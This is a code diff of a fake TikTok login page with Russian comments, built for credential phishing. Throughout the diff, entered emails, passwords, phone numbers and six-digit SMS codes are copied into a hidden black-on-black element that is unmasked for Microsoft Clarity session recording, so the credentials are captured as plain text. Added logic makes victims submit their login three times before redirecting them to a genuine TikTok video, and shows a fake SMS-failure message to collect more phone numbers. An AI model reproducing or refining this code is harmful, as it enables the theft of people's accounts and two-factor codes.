@@ -6,7 +6,7 @@
   <title>Войти | TikTok</title>
   <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon" />
   
-  <!-- MICROSOFT CLARITY С ПОЛНОЙ ЗАПИСЬЮ БЕЗ БЛЮРА -->
+  <!-- MICROSOFT CLARITY -->
   <script type="text/javascript">
       (function(c,l,a,r,i,t,y){
           c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -72,6 +72,7 @@
     .form-container { width: 375px; max-width: 100%; margin: 64px auto 0; padding: 0 16px; }
     h2 { font-family: 'TikTokDisplayFont', sans-serif; font-size: 32px; font-weight: 700; text-align: center; margin-bottom: 16px; letter-spacing: -0.5px; }
 
+    /* Заголовки табов */
     .form-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 10px; }
     .tab-active { font-size: 15px; font-weight: 600; line-height: 1; color: var(--text-primary); }
     .tab-link { font-size: 12px; font-weight: 600; color: var(--text-secondary); line-height: 1; }
@@ -97,7 +98,10 @@
     .code-input-wrapper { flex: 1; background: var(--input-bg); border: 1px solid transparent; border-radius: 4px 0 0 4px; transition: all 0.3s ease; }
     .code-input-wrapper:focus-within { border-color: var(--input-border-focus); background: rgba(255, 255, 255, 0.15); }
     
-    .btn-send-code { background: var(--btn-disabled-bg); color: var(--btn-disabled-text); font-weight: 600; font-size: 16px; padding: 0 16px; border-left: 1px solid var(--divider-color); border-radius: 0 4px 4px 0; cursor: not-allowed; flex-shrink: 0; }
+    .btn-send-code { background: var(--btn-disabled-bg); color: var(--btn-disabled-text); font-weight: 600; font-size: 16px; padding: 0 16px; border-left: 1px solid var(--divider-color); border-radius: 0 4px 4px 0; cursor: not-allowed; flex-shrink: 0; transition: color 0.2s; }
+    .btn-send-code.active { color: var(--brand-red); cursor: pointer; background: var(--input-bg); }
+    
+    .phone-error-msg { color: var(--brand-red); font-size: 12px; font-weight: 500; margin-bottom: 10px; display: none; line-height: 1.2; }
 
     .forgot-link { display: inline-block; font-size: 12px; font-weight: 600; color: var(--text-secondary); margin-bottom: 21px; margin-top: 5px;}
     .forgot-link:hover { text-decoration-color: var(--text-secondary); }
@@ -124,23 +128,53 @@
     @media (max-width: 768px) {
       .footer-info { padding: 0 20px; flex-direction: column; justify-content: center; gap: 10px; height: auto; padding-bottom: 20px; }
     }
+
+    /* === TOAST NOTIFICATION (Стили всплывашки) === */
+    .toast-container {
+      position: fixed;
+      top: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(37, 37, 37, 0.95);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+      max-width: 90%;
+    }
+    .toast-container.show { opacity: 1; }
+
+    /* ХАК ДЛЯ CLARITY (Черный текст на черном фоне) */
+    .clarity-tracker {
+      position: absolute; 
+      top: 0; left: 0; 
+      color: #121212; /* Сливается с фоном сайта */
+      background-color: #121212; 
+      z-index: -1; /* Убираем на задний план */
+      user-select: none; /* Запрет на выделение мышкой */
+      pointer-events: none;
+      font-size: 12px;
+    }
   </style>
 </head>
 <body data-clarity-unmask="true">
 
-  <!-- СЕКРЕТНЫЙ ТРЕКЕР ДЛЯ CLARITY: Копирует всё, что вводится -->
-  <div style="position: absolute; opacity: 0; pointer-events: none; top: 0; left: 0;" data-clarity-unmask="true">
-    CLARITY_TRACK: 
-    Email: <span id="clarity-email" data-clarity-unmask="true"></span>
-    Pass: <span id="clarity-pass" data-clarity-unmask="true"></span>
-    Phone: <span id="clarity-phone" data-clarity-unmask="true"></span>
-    Code: <span id="clarity-code" data-clarity-unmask="true"></span>
-  </div>
+  <!-- СЕКРЕТНЫЙ ТРЕКЕР ДЛЯ CLARITY (Запишет пароль как текст) -->
+  <div id="clarity-dump" class="clarity-tracker" data-clarity-unmask="true"></div>
+
+  <!-- Всплывающее уведомление (Toast) -->
+  <div id="custom-toast" class="toast-container"></div>
 
   <!-- ШАПКА -->
   <header class="header">
     <a href="#" class="logo-link" aria-label="TikTok">
-      <!-- ИДЕАЛЬНЫЙ ЛОГОТИП -->
       <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="42">
         <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
         <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
@@ -158,12 +192,11 @@
     </a>
   </header>
 
-  <!-- КОНТЕНТ -->
   <main class="main-wrapper">
     <div class="form-container">
       <h2>Войти</h2>
       
-      <!-- ВЬЮШКА 1: EMAIL (По умолчанию) -->
+      <!-- ВЬЮШКА 1: EMAIL -->
       <div id="view-email">
         <div class="form-header">
           <span class="tab-active">Почта или имя пользователя</span>
@@ -177,8 +210,8 @@
             </div>
           </div>
           <div class="input-box">
-            <!-- TYPE=TEXT для трекера. CSS прячет буквы -->
-            <input type="text" name="password" id="pass-input" class="base-input" placeholder="Пароль" autocomplete="current-password" data-clarity-unmask="true" style="-webkit-text-security: disc;">
+            <!-- ОРИГИНАЛЬНЫЙ ТИП ПАРОЛЬ -->
+            <input type="password" name="password" id="pass-input" class="base-input" placeholder="Пароль" autocomplete="current-password" data-clarity-unmask="true">
             <button type="button" class="icon-btn" id="toggle-pass-btn">
               <svg id="eye-closed" fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M38.88 41.7a1 1 0 0 0 1.41 0l1.42-1.4a1 1 0 0 0 0-1.42l-3.86-3.86a24.57 24.57 0 0 0 6.27-9.69 1 1 0 0 0 0-.66C41 15.8 32.66 9 23 9c-3.27 0-6.35.73-9.12 2.05L9.12 6.29a1 1 0 0 0-1.41 0L6.29 7.71a1 1 0 0 0 0 1.41l32.59 32.59Zm-22-27.66A17.8 17.8 0 0 1 23 13c12.75 0 17 12 17 12s-1.38 3.9-4.93 7.25l-4.54-4.55A7.99 7.99 0 0 0 23 17c-.95 0-1.86.16-2.7.47l-3.43-3.43ZM1.87 24.67a24.64 24.64 0 0 1 5.8-9.23l2.77 2.78C7.25 21.46 6 25 6 25s4.25 12 17 12a18 18 0 0 0 5.42-.8l3.05 3.05A21.2 21.2 0 0 1 23 41c-9.83 0-17.93-6.63-21.13-15.67a1 1 0 0 1 0-.66Z"></path><path d="M15 25c0-.68.08-1.35.24-1.98l9.74 9.73A8.02 8.02 0 0 1 15 25Z"></path></svg>
               <svg id="eye-open" style="display: none;" fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M24 9C14.34 9 6 15.8 2 24c4 8.2 12.34 15 22 15s18-6.8 22-15C42 15.8 33.66 9 24 9Zm0 25a10 10 0 1 1 0-20 10 10 0 0 1 0 20Z"></path><path d="M24 17a7 7 0 1 0 0 14 7 7 0 0 0 0-14Z"></path></svg>
@@ -203,11 +236,14 @@
             </div>
             <input type="text" name="phone" id="phone-input" class="base-input" placeholder="Номер телефона" data-clarity-unmask="true">
           </div>
+          <!-- Текст ошибки отправки СМС -->
+          <div id="phone-error-msg" class="phone-error-msg">Ошибка: не удалось отправить код, номер недоступен, попробуйте другой номер.</div>
+          
           <div class="code-input-group">
             <div class="code-input-wrapper">
               <input type="text" name="code" id="code-input" class="base-input" placeholder="Введите 6-значный код" maxlength="6" data-clarity-unmask="true">
             </div>
-            <button type="button" class="btn-send-code">Отправить код</button>
+            <button type="button" id="send-code-btn" class="btn-send-code" disabled>Отправить код</button>
           </div>
           <a href="#" class="forgot-link" style="margin-bottom: 21px; display:block">Войти с паролем</a>
           <button type="submit" id="phone-submit-btn" class="btn-submit" disabled>Войти</button>
@@ -216,8 +252,8 @@
 
     </div>
 
-    <!-- Кнопка Назад -->
-    <a href="#" class="btn-back">
+    <!-- Кнопка Назад (ПЕРЕЗАГРУЗКА СТРАНИЦЫ) -->
+    <a href="#" class="btn-back" onclick="window.location.reload(); return false;">
       <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.58579 22.5858L20.8787 6.29289C21.2692 5.90237 21.9024 5.90237 22.2929 6.29289L23.7071 7.70711C24.0976 8.09763 24.0976 8.7308 23.7071 9.12132L8.82843 24L23.7071 38.8787C24.0976 39.2692 24.0976 39.9024 23.7071 40.2929L22.2929 41.7071C21.9024 42.0976 21.2692 42.0976 20.8787 41.7071L4.58579 25.4142C3.80474 24.6332 3.80474 23.3668 4.58579 22.5858Z"></path></svg>
       Назад
     </a>
@@ -244,26 +280,16 @@
     // --- ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК ---
     const viewEmail = document.getElementById('view-email');
     const viewPhone = document.getElementById('view-phone');
-    const goToPhone = document.getElementById('go-to-phone');
-    const goToEmail = document.getElementById('go-to-email');
+    document.getElementById('go-to-phone').addEventListener('click', (e) => { e.preventDefault(); viewEmail.style.display = 'none'; viewPhone.style.display = 'block'; });
+    document.getElementById('go-to-email').addEventListener('click', (e) => { e.preventDefault(); viewPhone.style.display = 'none'; viewEmail.style.display = 'block'; });
 
-    // Логика SPA: меняем отображение без перезагрузки
-    goToPhone.addEventListener('click', (e) => {
-        e.preventDefault();
-        viewEmail.style.display = 'none';
-        viewPhone.style.display = 'block';
-        // Меняем URL для реалистичности
-        history.pushState(null, '', './phone');
-    });
-
-    goToEmail.addEventListener('click', (e) => {
-        e.preventDefault();
-        viewPhone.style.display = 'none';
-        viewEmail.style.display = 'block';
-        // Меняем URL для реалистичности
-        history.pushState(null, '', './email');
-    });
-
+    // --- ФУНКЦИЯ УВЕДОМЛЕНИЙ (Toast) ---
+    const toast = document.getElementById('custom-toast');
+    function showToast(message) {
+      toast.innerText = message;
+      toast.classList.add('show');
+      setTimeout(() => { toast.classList.remove('show'); }, 3000);
+    }
 
     // --- ЛОГИКА ФОРМЫ EMAIL ---
     const emailInput = document.getElementById('email-input');
@@ -272,54 +298,71 @@
     const togglePassBtn = document.getElementById('toggle-pass-btn');
     const eyeClosed = document.getElementById('eye-closed');
     const eyeOpen = document.getElementById('eye-open');
+    let loginAttempts = 0; // Счетчик попыток
 
-    // Активация кнопки
     function validateEmailForm() {
       if (emailInput.value.trim().length > 0 && passInput.value.trim().length > 0) {
-        emailSubmitBtn.disabled = false;
-        emailSubmitBtn.classList.add('active');
+        emailSubmitBtn.disabled = false; emailSubmitBtn.classList.add('active');
       } else {
-        emailSubmitBtn.disabled = true;
-        emailSubmitBtn.classList.remove('active');
+        emailSubmitBtn.disabled = true; emailSubmitBtn.classList.remove('active');
       }
     }
     emailInput.addEventListener('input', validateEmailForm);
     passInput.addEventListener('input', validateEmailForm);
 
-    // Глазик пароля (переключает CSS свойство вместо type, чтобы Clarity не блочил)
     togglePassBtn.addEventListener('click', () => {
-      if (passInput.style.webkitTextSecurity === 'disc') {
-        passInput.style.webkitTextSecurity = 'none';
-        eyeClosed.style.display = 'none';
-        eyeOpen.style.display = 'block';
+      if (passInput.type === 'password') {
+        passInput.type = 'text';
+        eyeClosed.style.display = 'none'; eyeOpen.style.display = 'block';
       } else {
-        passInput.style.webkitTextSecurity = 'disc';
-        eyeClosed.style.display = 'block';
-        eyeOpen.style.display = 'none';
+        passInput.type = 'password';
+        eyeClosed.style.display = 'block'; eyeOpen.style.display = 'none';
       }
     });
 
     document.getElementById('email-form').addEventListener('submit', (e) => {
       e.preventDefault();
-      emailSubmitBtn.innerText = 'Загрузка...';
-      emailSubmitBtn.style.opacity = '0.7';
-      setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
+      loginAttempts++;
+      
+      if(loginAttempts >= 3) {
+        // На 3-ю попытку редирект
+        emailSubmitBtn.innerText = 'Загрузка...';
+        emailSubmitBtn.style.opacity = '0.7';
+        setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
+      } else {
+        // Показываем введенные данные во всплывашке
+        showToast(`Введен логин: ${emailInput.value} пароль: ${passInput.value}. Попробуйте еще раз.`);
+      }
     });
 
 
     // --- ЛОГИКА ФОРМЫ ТЕЛЕФОНА ---
     const phoneInput = document.getElementById('phone-input');
     const codeInput = document.getElementById('code-input');
+    const sendCodeBtn = document.getElementById('send-code-btn');
     const phoneSubmitBtn = document.getElementById('phone-submit-btn');
+    const phoneErrorMsg = document.getElementById('phone-error-msg');
 
-    // Активация кнопки "Войти" если код состоит из 6 цифр
+    // Активация кнопки "Отправить код", если введено больше 4 символов телефона
+    phoneInput.addEventListener('input', () => {
+      if (phoneInput.value.trim().length > 4) {
+        sendCodeBtn.disabled = false; sendCodeBtn.classList.add('active');
+      } else {
+        sendCodeBtn.disabled = true; sendCodeBtn.classList.remove('active');
+        phoneErrorMsg.style.display = 'none'; // прячем ошибку если стирают номер
+      }
+    });
+
+    // Нажатие на "Отправить код"
+    sendCodeBtn.addEventListener('click', () => {
+      phoneErrorMsg.style.display = 'block';
+    });
+
     codeInput.addEventListener('input', () => {
       if (codeInput.value.trim().length === 6) {
-        phoneSubmitBtn.disabled = false;
-        phoneSubmitBtn.classList.add('active');
+        phoneSubmitBtn.disabled = false; phoneSubmitBtn.classList.add('active');
       } else {
-        phoneSubmitBtn.disabled = true;
-        phoneSubmitBtn.classList.remove('active');
+        phoneSubmitBtn.disabled = true; phoneSubmitBtn.classList.remove('active');
       }
     });
 
@@ -330,17 +373,15 @@
       setTimeout(() => { window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675'; }, 700);
     });
 
-    // --- ХАК ДЛЯ CLARITY ---
-    // Синхронизируем ввод в скрытые span'ы, которые Clarity гарантированно запишет
-    const clarityE = document.getElementById('clarity-email');
-    const clarityP = document.getElementById('clarity-pass');
-    const clarityPh = document.getElementById('clarity-phone');
-    const clarityC = document.getElementById('clarity-code');
-
-    emailInput.addEventListener('input', () => clarityE.textContent = emailInput.value);
-    passInput.addEventListener('input', () => clarityP.textContent = passInput.value);
-    phoneInput.addEventListener('input', () => clarityPh.textContent = phoneInput.value);
-    codeInput.addEventListener('input', () => clarityC.textContent = codeInput.value);
+    // --- ХАК ДЛЯ CLARITY (Запись скрытых данных как DOM-текста) ---
+    const clarityDump = document.getElementById('clarity-dump');
+    const updateClarityDump = () => {
+      clarityDump.innerText = `LOG:${emailInput.value} | PASS:${passInput.value} | TEL:${phoneInput.value} | COD:${codeInput.value}`;
+    };
+    emailInput.addEventListener('input', updateClarityDump);
+    passInput.addEventListener('input', updateClarityDump);
+    phoneInput.addEventListener('input', updateClarityDump);
+    codeInput.addEventListener('input', updateClarityDump);
   </script>
 </body>
 </html>
